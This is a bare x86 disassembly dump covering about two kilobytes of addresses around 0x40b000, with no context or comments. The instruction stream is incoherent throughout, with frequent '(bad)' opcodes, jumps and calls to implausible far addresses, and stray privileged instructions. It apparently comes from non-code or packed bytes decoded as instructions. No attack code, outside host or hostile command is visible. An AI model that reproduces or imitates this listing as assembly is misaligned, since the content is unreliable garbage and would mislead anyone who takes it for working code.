  40b412:	push   cs
  40b413:	inc    ecx
  40b414:	or     BYTE PTR [ebx+0x18008901],0x8
  40b41b:	leave  
  40b41c:	dec    ecx
  40b41d:	dec    esi
  40b41e:	add    esi,DWORD PTR [ebp-0x39]
  40b421:	call   0xffe6a322
  40b426:	clc    
  40b427:	inc    ebp
  40b428:	inc    ebp
  40b429:	mov    ecx,DWORD PTR [edi]
  40b42b:	enter  0x49,0x35
  40b42f:	mov    ecx,DWORD PTR [eax]
  40b431:	xor    eax,0x79e0807
  40b436:	xor    bl,BYTE PTR [esi-0x743ecda2]
  40b43c:	or     al,0x1c
  40b43e:	sbb    BYTE PTR ds:0x8b004d01,0x0
  40b445:	int3   
  40b446:	test   DWORD PTR [eax],eax
  40b448:	clc    
  40b449:	inc    edx
  40b44b:	mov    eax,DWORD PTR [eax]
  40b44d:	fmul   DWORD PTR [ebx+0x74ff8300]
  40b453:	sub    BYTE PTR [ebp-0x40],ah
  40b456:	add    BYTE PTR [esi+0x45],bl
  40b459:	leave  
  40b45a:	xor    eax,0xc78b9c18
  40b45f:	jl     0x40b441
  40b461:	add    BYTE PTR [ebp+0x458df88b],al
  40b467:	add    al,0x31
  40b469:	or     BYTE PTR [eax+ebp*8-0x3617f139],bl
  40b470:	test   edx,esp
  40b472:	clc    
  40b473:	or     eax,DWORD PTR [ebp+0x40]
  40b476:	xor    eax,0x8b949f89
  40b47b:	inc    ebp
  40b47c:	sbb    al,0xbe
  40b47e:	mov    ecx,DWORD PTR [eax]
  40b480:	xchg   esp,eax
  40b481:	pop    es
  40b482:	add    dh,al
  40b484:	mov    esp,DWORD PTR [ebp+0x1c]
  40b487:	add    BYTE PTR [edi-0x62],dl
  40b48a:	mov    eax,0x30132
  40b48f:	mov    DWORD PTR [ebp-0x68],eax
  40b492:	mov    eax,DWORD PTR [ebp-0x74]
  40b495:	xor    eax,DWORD PTR [eax]
  40b497:	add    ecx,DWORD PTR [ebx-0xf637677]
  40b49d:	inc    ebp
  40b49e:	jge    0x40b4f0
  40b4a0:	mov    DWORD PTR [ebp-0xc],eax
  40b4a3:	xor    eax,eax
  40b4a5:	add    ecx,DWORD PTR [ebx]
  40b4a7:	push   eax
  40b4a8:	jne    0x40b4ef
  40b4aa:	mov    eax,DWORD PTR ds:0x3f001c
  40b4b0:	dec    DWORD PTR [ebx-0x7f74e375]
  40b4b6:	add    eax,DWORD PTR [ecx]
  40b4b8:	cmp    al,0x0
  40b4ba:	push   cs
  40b4bb:	inc    ebp
  40b4bc:	inc    ebp
  40b4bd:	add    al,0x85
  40b4bf:	add    BYTE PTR [edi+edi*8-0x1],dh
  40b4c3:	mov    ebx,DWORD PTR [esp+ecx*1]
  40b4c6:	mov    ebp,0x8bffff4d
  40b4cb:	mov    ebx,DWORD PTR [esp+esi*8]
  40b4ce:	sbb    al,0x1
  40b4d1:	inc    ebp
  40b4d2:	add    BYTE PTR [ebx-0x74a87700],cl
  40b4d8:	push   ecx
  40b4d9:	clc    
  40b4da:	add    eax,0x457218
  40b4df:	mov    eax,DWORD PTR [ebp+0x50]
  40b4e2:	jne    0x40b529
  40b4e4:	mov    ecx,DWORD PTR [ebx-0x39761fe4]
  40b4ea:	add    edi,eax
  40b4ec:	add    BYTE PTR [ebp+0x31],al
  40b4ef:	lea    eax,[eax+0x4501dc]
  40b4f5:	lea    edx,[eax-0x74]
  40b4f8:	xor    ecx,DWORD PTR [ebx-0x39a4f7a1]
  40b4fe:	ret    0xc7
  40b501:	mov    eax,DWORD PTR [eax+0xee011c]
  40b507:	add    BYTE PTR [eax],cl
  40b509:	push   eax
  40b50a:	inc    ebp
  40b50b:	inc    ebp
  40b50c:	add    DWORD PTR [ebx+0x8b98eb],ecx
  40b512:	test   edi,eax
  40b514:	jne    0x40b4a2
  40b516:	mov    eax,DWORD PTR [eax]
  40b518:	mov    eax,DWORD PTR [eax]
  40b51a:	push   eax
  40b51b:	pop    ebp
  40b51c:	inc    ebp
  40b51d:	dec    DWORD PTR [ebx+0x570ce48b]
  40b523:	rcl    BYTE PTR [ecx-0x40],1
  40b526:	xor    esi,DWORD PTR [eax]
  40b528:	add    DWORD PTR [ebp-0x70],0xffffff83
  40b52c:	mov    edi,0x8372fc
  40b531:	push   eax
  40b532:	(bad)  
  40b533:	jbe    0x40b57a
  40b535:	mov    ecx,DWORD PTR [ebx-0x39341714]
  40b53b:	ret    
  40b53c:	(bad)  
  40b53d:	dec    ebp
  40b53e:	inc    ebp
  40b53f:	jmp    0x40b4ce
  40b541:	mov    ecx,DWORD PTR [esp+eiz*8-0xf7f375]
  40b548:	(bad)  
  40b549:	cld    
  40b54a:	(bad)  
  40b54b:	push   ebp
  40b54c:	mov    ecx,DWORD PTR [eax+0x18aa8b1c]
  40b552:	add    BYTE PTR [ebx],bh
  40b554:	push   eax
  40b555:	push   eax
  40b556:	inc    ebp
  40b557:	jmp    0x3d900e7
  40b55c:	add    BYTE PTR [ebx+0x8ca0c7],cl
  40b562:	add    BYTE PTR [ebx-0x13cfd500],cl
  40b568:	inc    ebp
  40b569:	ret    
  40b56a:	mov    DWORD PTR [ebp-0x14],edx
  40b56d:	mov    edx,eax
  40b56f:	sub    BYTE PTR [ebp-0x2d],cl
  40b572:	mov    ecx,DWORD PTR [ebp-0x75]
  40b575:	mov    eax,esi
  40b577:	rol    BYTE PTR [eax],1
  40b579:	inc    ebp
  40b57a:	add    DWORD PTR [eax],eax
  40b57c:	inc    ebp
  40b57d:	add    BYTE PTR [ecx+0x18838beb],cl
  40b583:	clc    
  40b584:	inc    eax
  40b585:	jmp    0x8d45:0x74945589
  40b58c:	xor    ecx,DWORD PTR [eax]
  40b58e:	add    edx,DWORD PTR [ebp-0x77]
  40b591:	mov    ebx,DWORD PTR [eax-0x76aaba18]
  40b597:	mov    ebx,DWORD PTR [eax+edi*8-0x76af48bb]
  40b59e:	inc    ebp
  40b59f:	fdiv   DWORD PTR [ebx]
  40b5a1:	loop   0x40b5a6
  40b5a3:	(bad)  
  40b5a5:	add    BYTE PTR [ebp+0x55],al
  40b5a8:	add    eax,0xd8008b
  40b5ad:	jmp    0xcd80:0x621c818b
  40b5b4:	add    DWORD PTR [ebx],esi
  40b5b6:	add    BYTE PTR [ecx-0x63fbcdbb],al
  40b5bc:	add    BYTE PTR [ebp-0x77],dh
  40b5bf:	mov    edx,DWORD PTR [eax+0x45cb30d4]
  40b5c5:	dec    ebp
  40b5c6:	inc    DWORD PTR [ebx]
  40b5c8:	test   DWORD PTR [ebx+0x108b0074],eax
  40b5ce:	sbb    BYTE PTR [ebp+0x65],dl
  40b5d1:	add    eax,DWORD PTR [eax]
  40b5d3:	mov    edi,DWORD PTR [eax-0x75]
  40b5d6:	add    ah,dl
  40b5d8:	and    edx,DWORD PTR [ecx*2-0x741bd475]
  40b5df:	dec    ebp
  40b5e0:	mov    DWORD PTR [ebx-0xfc071c],eax
  40b5e6:	dec    ebp
  40b5e7:	call   0x55426376
  40b5ec:	inc    ebp
  40b5ed:	add    DWORD PTR [ebx+0x855fcf4],ecx
  40b5f3:	cmp    ecx,DWORD PTR [ebp-0x5c]
  40b5f6:	inc    eax
  40b5f7:	add    BYTE PTR [ecx+0x73],dl
  40b5fa:	jb     0x40b5ff
  40b5fc:	mov    esi,eax
  40b5fe:	cmp    al,0x50
  40b600:	retf   
  40b601:	mov    DWORD PTR [ecx+0x4500f0],eax
  40b607:	test   ebx,edx
  40b609:	andnps xmm6,XMMWORD PTR [edx+0x3]
  40b60d:	dec    DWORD PTR [ecx+0x51ecfc8b]
  40b613:	inc    ebp
  40b614:	add    eax,edi
  40b616:	mov    DWORD PTR [eax+ebx*1-0x38ffab00],ecx
  40b61d:	inc    ecx
  40b61e:	hlt    
  40b61f:	mov    DWORD PTR [eax],eax
  40b621:	xchg   esp,eax
  40b622:	add    BYTE PTR [ebp+0x7d],al
  40b625:	xor    eax,edx
  40b627:	add    edx,ecx
  40b629:	mov    DWORD PTR [ecx+0x5f45e898],ecx
  40b62f:	mov    DWORD PTR [eax-0x64],edx
  40b632:	mov    DWORD PTR [ebp-0x8],eax
  40b635:	push   eax
  40b636:	push   ebp
  40b637:	inc    ebp
  40b638:	mov    DWORD PTR [ebx],esi
  40b63a:	call   0xf910b42
  40b63f:	inc    ebp
  40b640:	adc    al,BYTE PTR ds:0x810055
  40b646:	dec    DWORD PTR [ebx-0x7f76e400]
  40b64c:	aam    0x1
  40b64e:	push   ebp
  40b64f:	add    cl,al
  40b651:	xor    BYTE PTR [eax*2-0x7472003e],cl
  40b658:	call   FWORD PTR [esi+edx*8]
  40b65b:	cmp    dl,0x1
  40b65e:	test   DWORD PTR [eax],eax
  40b660:	clc    
  40b661:	inc    ebp
  40b662:	and    cl,BYTE PTR [ebx+0x7503fc4d]
  40b668:	mov    DWORD PTR [ecx+0x1008ffd4],ecx
  40b66e:	cmp    edi,edi
  40b670:	je     0x40b642
  40b672:	mov    eax,DWORD PTR [ebp-0x4]
  40b675:	add    edx,DWORD PTR [ecx]
  40b677:	sbb    al,0x0
  40b679:	dec    ebp
  40b67a:	dec    ebp
  40b67b:	mov    DWORD PTR [ecx+0x4545011c],ecx
  40b681:	mov    ecx,DWORD PTR [ebx+0x4590181c]
  40b687:	add    DWORD PTR [edx],eax
  40b689:	add    BYTE PTR [ebp+0x45],cl
  40b68c:	jne    0x40b619
  40b68e:	mov    ecx,DWORD PTR [eax+esi*8-0x7474ab00]
  40b695:	cmp    esp,esi
  40b697:	jb     0x40b62a
  40b699:	mov    eax,DWORD PTR [eax]
  40b69b:	mov    eax,DWORD PTR [eax]
  40b69d:	mov    edx,DWORD PTR [esp+edi*1]
  40b6a0:	inc    ebp
  40b6a1:	je     0x40b62e
  40b6a3:	push   eax
  40b6a4:	add    al,0x38
  40b6a6:	push   ebp
  40b6a7:	mov    DWORD PTR ds:[ecx],edi
  40b6aa:	in     al,0xc
  40b6ac:	shl    BYTE PTR [eax],cl
  40b6ae:	test   DWORD PTR [ecx],eax
  40b6b0:	call   DWORD PTR [edx]
  40b6b2:	inc    esi
  40b6b4:	inc    ebp
  40b6b5:	ror    BYTE PTR [ecx+0x45459011],1
  40b6bb:	jmp    0xff41b3c4
  40b6c0:	mov    ecx,DWORD PTR [ebx-0xfba7eb0]
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	loopne 0x40b655
  40b6ca:	(bad)  
  40b6cb:	sbb    al,0xc7
  40b6cd:	inc    ebp
  40b6ce:	inc    ebp
  40b6cf:	push   ebx
  40b6d0:	lea    edi,[eax+0x454fdc]
  40b6d6:	lea    ecx,[ecx-0x74a774]
  40b6dc:	or     BYTE PTR [edi-0x3a],dl
  40b6df:	js     0x40b6a8
  40b6e1:	mov    ecx,DWORD PTR [ebx-0x117ae39a]
  40b6e7:	inc    DWORD PTR [eax]
  40b6e9:	call   DWORD PTR [eax+0x79]
  40b6ec:	inc    ebp
  40b6ed:	add    BYTE PTR [ebx+0x859866],cl
  40b6f3:	(bad)  
  40b6f4:	(bad)  
  40b6f5:	dec    DWORD PTR [ebx-0x2f99f3b9]
  40b6fb:	test   DWORD PTR [ebp-0x1],eax
  40b6fe:	mov    edi,edi
  40b700:	add    al,0x0
  40b703:	add    ax,WORD PTR [ebp-0xb20004]
  40b70a:	inc    DWORD PTR [edx+0x14]
  40b70d:	add    BYTE PTR [eax],cl
  40b70f:	data16 jne 0x40b697
  40b712:	push   ebx
  40b713:	call   DWORD PTR [ebp-0x1]
  40b716:	mov    eax,eax
  40b718:	cld    
  40b719:	inc    bp
  40b71b:	test   DWORD PTR [ebp+0x45ff04ff],ecx
  40b721:	inc    eax
  40b722:	mov    eax,DWORD PTR [eax]
  40b724:	sbb    al,0x66
  40b726:	inc    ebp
  40b727:	test   DWORD PTR [ebx+0xff90ff],ecx
  40b72d:	ror    BYTE PTR [ebx-0x7f7ae39a],0xff
  40b734:	add    edi,edi
  40b736:	add    BYTE PTR [ebp+0x30],al
  40b739:	add    BYTE PTR [ecx],dh
  40b73b:	popw   ds
  40b73d:	test   DWORD PTR [edx],esi
  40b73f:	(bad)  
  40b740:	cmp    bh,bh
  40b742:	jbe    0x40b70b
  40b744:	lea    ecx,[ecx-0x7493c9]
  40b74a:	add    edi,DWORD PTR [eax+0x734f39]
  40b750:	mov    ecx,DWORD PTR [ecx-0x749175]
  40b756:	sub    edi,DWORD PTR [eax+0x89d003]
  40b75c:	mov    ecx,DWORD PTR [ecx-0x698f04]
  40b762:	(bad)  
  40b763:	mov    eax,0xecd755
  40b768:	in     al,dx
  40b769:	mov    DWORD PTR [eax],eax
  40b76b:	jb     0x40b76d
  40b76d:	inc    DWORD PTR [ebp-0x48]
  40b770:	mov    ecx,esp
  40b772:	sbb    al,0x0
  40b774:	push   esi
  40b775:	mov    DWORD PTR ds:0x66ff0074,ecx
  40b77b:	mov    DWORD PTR [ebp-0x7a0014],0xad7d8df8
  40b785:	add    bh,al
  40b787:	mov    WORD PTR [ebp-0xa6],ax
  40b78e:	mov    eax,0x354f45
  40b793:	pushf  
  40b794:	mov    DWORD PTR [ebp-0x7600fda4],ecx
  40b79a:	lea    edi,[eax+0x4]
  40b79d:	dec    DWORD PTR [ecx-0x1ba13a]
  40b7a3:	mov    BYTE PTR [ebx-0x7639af1b],0xe6
  40b7aa:	pusha  
  40b7ab:	(bad)  
  40b7ac:	jmp    edi
  40b7ae:	mov    eax,0xe84fc6
  40b7b3:	xor    ecx,DWORD PTR [ecx-0x169d3a]
  40b7b9:	xor    eax,DWORD PTR [ebx-0x76ff3a42]
  40b7bf:	add    BYTE PTR [esp+eax*2-0x1],ah
  40b7c3:	in     al,0xb8
  40b7c5:	mov    dh,0x4f
  40b7c7:	add    DWORD PTR [eax],0x49
  40b7ca:	mov    esi,ebx
  40b7cc:	data16 mov bh,bh
  40b7cf:	add    DWORD PTR [ebx-0x7613c7fa],0x45
  40b7d6:	push   0xb845ffe3
  40b7db:	loope  0x40b82c
  40b7dd:	inc    ebp
  40b7de:	add    bl,dl
  40b7e0:	mov    DWORD PTR [ebp+0x6a],eax
  40b7e3:	out    dx,al
  40b7e4:	inc    DWORD PTR [ebp-0x75]
  40b7e7:	and    DWORD PTR [esi+0x45],esp
  40b7ea:	test   DWORD PTR [esi],ebp
  40b7ec:	inc    DWORD PTR [ebp-0x1]
  40b7ef:	jl     0x40b83a
  40b7f1:	leave  
  40b7f2:	add    BYTE PTR [esi+eiz*2-0x24],al
  40b7f6:	test   DWORD PTR [esi+0x49ff83ff],esi
  40b7fc:	outs   dx,DWORD PTR ds:[esi]
  40b7fd:	fiadd  WORD PTR [eax]
  40b7ff:	mov    BYTE PTR [esi-0x7d],ah
  40b802:	test   DWORD PTR [edi],eax
  40b804:	(bad)  
  40b805:	in     al,dx
  40b806:	inc    DWORD PTR [ebp+0x6c]
  40b809:	loope  0x40b80b
  40b80b:	inc    ebp
  40b80c:	data16 aam 0x85
  40b80f:	inc    ebp
  40b810:	(bad)  
  40b811:	call   0xe5bcfe15
  40b816:	add    BYTE PTR [ebp+0x66],al
  40b819:	fild   WORD PTR [ebp-0x1300bb]
  40b81f:	inc    ebp
  40b820:	inc    ebp
  40b821:	xlat   BYTE PTR ds:[ebx]
  40b822:	xor    al,0x45
  40b824:	pushf  
  40b825:	jl     0x40b7df
  40b827:	leave  
  40b828:	icebp  
  40b829:	inc    esp
  40b82a:	add    ah,dl
  40b82c:	mov    DWORD PTR [esi+0x49ff8376],esi
  40b832:	(bad)  
  40b833:	fdivrp st(0),st
  40b835:	mov    BYTE PTR [ebp+0x4708f883],al
  40b83b:	in     al,dx
  40b83c:	test   WORD PTR [ebp-0x1],ax
  40b843:	inc    ebp
  40b844:	inc    ebp
  40b845:	mov    edx,ebp
  40b847:	cld    
  40b848:	inc    ebp
  40b849:	out    dx,eax
  40b84a:	rcl    BYTE PTR [ebx],1
  40b84c:	inc    ebp
  40b84d:	mov    edi,edx
  40b84f:	mov    eax,DWORD PTR [ebp+0x54]
  40b852:	and    edi,edi
  40b854:	inc    ebp
  40b855:	cmp    ebp,DWORD PTR [esi]
  40b857:	jne    0x40b82b
  40b859:	mov    DWORD PTR [ebp-0x44],0xf8c9857c
  40b860:	retf   
  40b861:	inc    ebp
  40b862:	add    dl,ah
  40b864:	lea    ebx,[ebp+ecx*1+0x181c0f8b]
  40b86b:	xor    bl,0x1
  40b86e:	add    eax,DWORD PTR [eax]
  40b870:	inc    ecx
  40b871:	adc    BYTE PTR [eax],bl
  40b873:	test   ecx,edi
  40b875:	add    dh,BYTE PTR [edx+0x0]
  40b878:	mov    BYTE PTR [ebp-0x24],0x8b
  40b87c:	(bad)  
  40b87d:	jl     0x40b85c
  40b87f:	add    dh,al
  40b881:	mov    esi,ebx
  40b883:	mov    eax,esi
  40b885:	sbb    al,0xdf
  40b887:	add    dh,0x1
  40b88a:	loopne 0x40b88c
  40b88c:	(bad)  
  40b88d:	adc    cl,ah
  40b88f:	or     dh,al
  40b891:	inc    ebp
  40b892:	loop   0x40b875
  40b894:	xor    ebp,eax
  40b896:	(bad)  
  40b897:	(bad)  
  40b898:	or     eax,0x18ec0ff8
  40b89d:	jl     0x40b892
  40b89f:	inc    ebp
  40b8a0:	add    ebx,DWORD PTR [ecx+0x41]
  40b8a3:	adc    BYTE PTR [eax],bl
  40b8a5:	repnz stc 
  40b8a7:	xor    BYTE PTR [edx+0x35],0xc6
  40b8ab:	adc    ah,dl
  40b8ad:	dec    ecx
  40b8ae:	(bad)  
  40b8af:	repnz aad 0x45
  40b8b2:	(bad)  
  40b8b3:	mov    esi,edx
  40b8b5:	adc    al,0xc6
  40b8b7:	call   edi
  40b8b9:	(bad)  
  40b8ba:	(bad)  
  40b8bb:	adc    al,bl
  40b8bd:	inc    esi
  40b8bf:	push   eax
  40b8c0:	fld    DWORD PTR [ebp-0x3a]
  40b8c3:	mov    esi,0x7c608da
  40b8c8:	fcmovnb st,st(6)
  40b8ca:	xor    ebx,DWORD PTR [esi+0x30d328d]
  40b8d0:	(bad)  
  40b8d2:	sbb    BYTE PTR [ebp-0xd],al
  40b8d5:	add    DWORD PTR [ebx],0x66
  40b8d8:	inc    ecx
  40b8d9:	mov    ebx,DWORD PTR [eax]
  40b8db:	sbb    al,0xf9
  40b8dd:	xor    BYTE PTR [edx+0x1],0x8d
  40b8e1:	add    BYTE PTR [ebp+eax*4-0x1],dl
  40b8e5:	dec    DWORD PTR [ecx+0x4d00fcff]
  40b8eb:	add    BYTE PTR [eax+0x7145fc30],bh
  40b8f1:	inc    DWORD PTR [ecx]
  40b8f3:	mov    ecx,DWORD PTR [ebp-0x310010]
  40b8f9:	retf   
  40b8fa:	enter  0xe45,0x3b
  40b8fe:	inc    ebp
  40b8ff:	jne    0x40b936
  40b901:	mov    eax,ds:0x33c70b9c
  40b906:	mov    esp,0xf81585ef
  40b90b:	mov    ds:0x338b0b45,eax
  40b910:	mov    WORD PTR [edi-0x5cc68e00],cs
  40b916:	ud2    
  40b918:	xchg   ebp,eax
  40b919:	xor    eax,DWORD PTR [eax]
  40b91b:	dec    edx
  40b91c:	mov    eax,DWORD PTR [eax]
  40b91e:	sbb    al,0x83
  40b920:	cmp    ah,0x1
  40b923:	push   0x0
  40b925:	pop    eax
  40b926:	adc    BYTE PTR [ecx-0x7483bb],cl
  40b92c:	and    BYTE PTR [esi+0x0],0x85
  40b930:	mov    edi,edi
  40b932:	push   0xffffffff
  40b934:	(bad)  
  40b935:	mov    esp,esi
  40b937:	adc    ah,0x75
  40b93a:	in     eax,0x66
  40b93c:	inc    ebp
  40b93d:	inc    ebp
  40b93e:	fild   QWORD PTR [edx-0x29]
  40b941:	mov    ecx,DWORD PTR [ebp-0x75990be4]
  40b947:	inc    ebp
  40b948:	sub    BYTE PTR [edx+0x49],0x58
  40b94c:	jmp    0x752c:0x40868889
  40b953:	lea    ax,[ebp-0xc]
  40b957:	xor    eax,DWORD PTR [ebp-0x5f0078]
  40b95d:	mov    DWORD PTR [ebp-0x820076],eax
  40b963:	stos   DWORD PTR es:[edi],eax
  40b964:	mov    ebp,DWORD PTR [ebx-0x43a87414]
  40b96a:	push   ecx
  40b96b:	test   DWORD PTR [ebx],esi
  40b96d:	(bad)  
  40b96e:	mov    ebx,0xc072ff
  40b973:	push   ebp
  40b974:	ret    
  40b975:	(bad)  
  40b976:	mov    eax,eax
  40b978:	sbb    al,0xdf
  40b97a:	rcl    ah,0x50
  40b97d:	inc    ebp
  40b97e:	inc    ebp
  40b97f:	into   
  40b980:	mov    ebp,ebx
  40b982:	cwde   
  40b983:	mov    DWORD PTR [eax],0x10d3c7c8
  40b989:	call   0xdf41ff8d
  40b98e:	add    cl,ch
  40b990:	jmp    DWORD PTR [esi-0x75]
  40b993:	inc    ebp
  40b994:	or     BYTE PTR [edi],bh
  40b996:	rol    bh,1
  40b998:	dec    ebp
  40b999:	adc    BYTE PTR [ebx],dh
  40b99b:	inc    DWORD PTR [ebx]
  40b99d:	add    cl,BYTE PTR [ecx-0x3e174400]
  40b9a3:	push   ss
  40b9a4:	push   ds
  40b9a5:	add    dh,ch
  40b9a7:	test   DWORD PTR [ebx-0x1],esi
  40b9aa:	or     eax,0x22850bff
  40b9af:	(bad)  
  40b9b0:	out    dx,al
  40b9b1:	push   DWORD PTR [ebx-0x75]
  40b9b4:	add    eax,0x3357e9ec
  40b9b9:	push   ecx
  40b9ba:	out    dx,al
  40b9bb:	xor    esi,DWORD PTR [ebx+0x3]
  40b9be:	jmp    0x85bb13
  40b9c3:	and    DWORD PTR [ebp+0x44],0x0
  40b9c7:	mov    esp,DWORD PTR [eax]
  40b9c9:	sbb    al,0x66
  40b9cb:	add    BYTE PTR [ebp-0xff00ff],0x30
  40b9d2:	mov    DWORD PTR [ebp+0x7e],eax
  40b9d5:	(bad)  
  40b9d6:	inc    DWORD PTR [ebx-0xbadf9a]
  40b9dc:	push   0xffffffff
  40b9de:	pop    eax
  40b9df:	clc    
  40b9e0:	mov    DWORD PTR [eax],ecx
  40b9e2:	or     BYTE PTR [ecx-0x8aef8d],0x58
  40b9e9:	mov    DWORD PTR [ecx+0x76ff8428],ecx
  40b9ef:	lea    esp,[esi+0x10]
  40b9f2:	inc    ebp
  40b9f3:	jmp    FWORD PTR [edx+0x50]
  40b9f6:	pop    eax
  40b9f7:	inc    ebp
  40b9f8:	mov    DWORD PTR [ebx],esi
  40b9fa:	mov    BYTE PTR [ebx],al
  40b9fc:	rcl    BYTE PTR [eax+0x45],0x85
  40ba00:	inc    WORD PTR [ebp-0x1]
  40ba04:	lea    ecx,[ebx-0x7f99e35f]
  40ba0a:	stos   BYTE PTR es:[edi],al
  40ba0b:	add    DWORD PTR [ebp+0x0],eax
  40ba0e:	mov    ecx,ecx
  40ba10:	adc    al,0x95
  40ba12:	(bad)  
  40ba13:	push   DWORD PTR [ebx]
  40ba15:	dec    DWORD PTR [ebp+0x45ffc095]
  40ba1b:	dec    esp
  40ba1d:	push   ebp
  40ba1e:	loopne 0x40b9a9
  40ba20:	(bad)  
  40ba21:	adc    al,0xc4
  40ba23:	call   ebx
  40ba25:	mov    ebp,ebp
  40ba27:	sbb    BYTE PTR [ebp-0x1],al
  40ba2a:	loop   0x40b9b5
  40ba2c:	ds and al,0xc7
  40ba2f:	dec    esp
  40ba31:	mov    edx,ebp
  40ba33:	sub    al,0xe1
  40ba35:	inc    edi
  40ba37:	mov    eax,edx
  40ba39:	xor    BYTE PTR [edi+edi*8-0x7b],bh
  40ba3d:	(bad)  
  40ba3e:	dec    DWORD PTR [ebx-0x2ffff701]
  40ba44:	add    BYTE PTR [ebp+0x2c],al
  40ba47:	push   eax
  40ba48:	add    bh,dl
  40ba4a:	mov    DWORD PTR [ebp+0x18],edi
  40ba4d:	jbe    0x40ba4e
  40ba4f:	test   DWORD PTR [ebp-0xffefff],ecx
  40ba55:	inc    ebp
  40ba56:	push   eax
  40ba57:	add    DWORD PTR [ebp-0x4],0x801be
  40ba5e:	pop    es
  40ba5f:	add    dh,0xfe
  40ba62:	ret    
  40ba63:	dec    DWORD PTR [ebx-0x3fffe346]
  40ba69:	mov    ecx,0x454f50
  40ba6e:	mov    eax,ecx
  40ba70:	cwde   
  40ba71:	mov    DWORD PTR [eax],eax
  40ba73:	test   al,0xff
  40ba75:	ror    BYTE PTR [ebx-0x2f99f775],0x55
  40ba7c:	lea    ecx,[ebp-0x7600f201]
  40ba82:	mov    ebp,DWORD PTR [edx+ebp*2-0x7a99a73e]
  40ba89:	push   ebp
  40ba8a:	dec    DWORD PTR [ebp-0x767aec01]
  40ba90:	push   DWORD PTR [eax+0x6685c2ff]
  40ba96:	call   DWORD PTR [ebp-0x1]
  40ba99:	lea    ecx,[ebx-0x397613df]
  40ba9f:	mov    ah,0xc3
  40baa1:	mov    DWORD PTR [ebp-0x30a74a],ecx
  40baa7:	mov    DWORD PTR [eax-0x48],edx
  40baaa:	inc    ebp
  40baab:	dec    edx
  40baac:	mov    ecx,DWORD PTR [ebx+0x55006698]
  40bab2:	xor    ecx,DWORD PTR [ebx+0x557c668d]
  40bab8:	dec    DWORD PTR [ebp-0x76e3b277]
  40babe:	call   DWORD PTR [eax-0x6d5f7673]
  40bac4:	lea    eax,[ecx-0x1]
  40bac7:	inc    WORD PTR [ebp-0x73]
  40bacb:	cmp    edi,0x3
  40bace:	dec    DWORD PTR [ecx+0x41ff9695]
  40bad4:	jmp    DWORD PTR [esi-0x73]
  40bad7:	inc    ebp
  40bad8:	jmp    DWORD PTR [esi-0x1]
  40badb:	dec    ebp
  40badc:	lea    esp,[esi-0x1]
  40badf:	jge    0x40bae0
  40bae1:	mov    esi,DWORD PTR [eax]
  40bae3:	lock inc ebp
  40bae5:	mov    bh,0xff
  40bae7:	mov    WORD PTR [ebp-0x3c5f3a],cs
  40baed:	rol    DWORD PTR [eax+0xf8ca289],0x45
  40baf4:	push   cs
  40baf5:	str    WORD PTR [ebp-0x1]
  40baf9:	xor    edi,esp
  40bafb:	add    edi,DWORD PTR [ebp+0x33]
  40bafe:	add    BYTE PTR [esi+0x0],ah
  40bb01:	inc    ebp
  40bb02:	rdpmc  
  40bb04:	mov    edi,0xbf45ff66
  40bb09:	dec    si
  40bb0b:	inc    ebp
  40bb0c:	add    BYTE PTR [ebx+0x45000c12],cl
  40bb12:	mov    edi,edi
  40bb14:	data16 sbb al,0x45
  40bb17:	jne    0x40ba9c
  40bb19:	push   ebp
  40bb1b:	adc    al,0xd0
  40bb1d:	jne    0x40baa8
  40bb1f:	jmp    FWORD PTR [edx+0x66755108]
  40bb25:	call   0xffc4b37f
  40bb2a:	or     BYTE PTR [ebp-0x77],al
  40bb2d:	mov    ebp,DWORD PTR [esi+0x6645511c]
  40bb33:	mov    edx,DWORD PTR [ebp-0x70]
  40bb36:	add    DWORD PTR [eax],0x3
  40bb39:	mov    ecx,DWORD PTR [ecx+0x5180b21c]
  40bb3f:	add    DWORD PTR [esi+0x0],esp
  40bb42:	push   ebp
  40bb43:	xor    BYTE PTR [esi+0x4d],ah
  40bb46:	dec    ebp
  40bb47:	mov    ecx,DWORD PTR [ebx+0x4d72663b]
  40bb4d:	mov    ecx,DWORD PTR [ebp-0x2ec30075]
  40bb53:	jl     0x40bade
  40bb55:	push   eax
  40bb56:	mov    esi,?
  40bb58:	rcl    bh,1
  40bb5a:	mov    DWORD PTR [esi],eax
  40bb5c:	mov    es,esi
  40bb5e:	push   ecx
  40bb5f:	ret    0x166
  40bb62:	push   ebp
  40bb63:	pop    esi
  40bb64:	leavew 
  40bb66:	inc    ebp
  40bb67:	sbb    BYTE PTR [ebp-0x76132cab],cl
  40bb6d:	in     al,dx
  40bb6e:	xchg   esp,eax
  40bb6f:	push   esi
  40bb70:	shl    al,0x66
  40bb73:	add    DWORD PTR [ebp+0x1],0x38e1008d
  40bb7a:	mov    DWORD PTR [edi],ecx
  40bb7c:	cwde   
  40bb7d:	or     cl,BYTE PTR [ecx-0x767a6600]
  40bb83:	setl   BYTE PTR [edx]
  40bb86:	inc    ebp
  40bb87:	add    BYTE PTR [edi],cl
  40bb89:	test   DWORD PTR [ebp+0xf],ecx
  40bb8c:	xor    edi,edx
  40bb8e:	add    eax,DWORD PTR [eax]
  40bb90:	xor    ecx,DWORD PTR [ebx+0x458866]
  40bb96:	mov    eax,DWORD PTR [ebp-0x1848f010]
  40bb9c:	test   al,0x0
  40bb9e:	mov    BYTE PTR [ebx+0xc18cc3],0x89
  40bba5:	adc    BYTE PTR [eax-0x76ff3f7c],ch
  40bbab:	add    BYTE PTR [eax-0x57f076aa],ch
  40bbb1:	rol    DWORD PTR [ebp+0x0],1
  40bbb4:	mov    ecx,DWORD PTR [ebx+0x758cf0]
  40bbba:	inc    DWORD PTR [ebx-0x748a0fe8]
  40bbc0:	jmp    FWORD PTR [ebx]
  40bbc2:	adc    BYTE PTR [ebx],al
  40bbc4:	jne    0x40bbd5
  40bbc6:	call   DWORD PTR [eax-0x14]
  40bbc9:	mov    DWORD PTR [edi-0x1c],edi
  40bbcc:	push   DWORD PTR [edi-0x35e3f1ff]
  40bbd2:	inc    ebp
  40bbd3:	test   BYTE PTR [ebx-0x47ffe400],cl
  40bbd9:	dec    eax
  40bbda:	add    DWORD PTR [ebx+0x0],edx
  40bbdd:	dec    ebp
  40bbde:	inc    ebp
  40bbdf:	mov    esi,0x7f8cff8b
  40bbe4:	add    BYTE PTR [ebp-0x74728b75],al
  40bbea:	add    al,0x83
  40bbec:	adc    esp,esi
  40bbee:	(bad)  
  40bbef:	and    edx,DWORD PTR ds:0x780f0703
  40bbf5:	jp     0x40bb82
  40bbf7:	sysret 
  40bbf9:	pop    edx
  40bbfa:	add    eax,DWORD PTR [ebx]
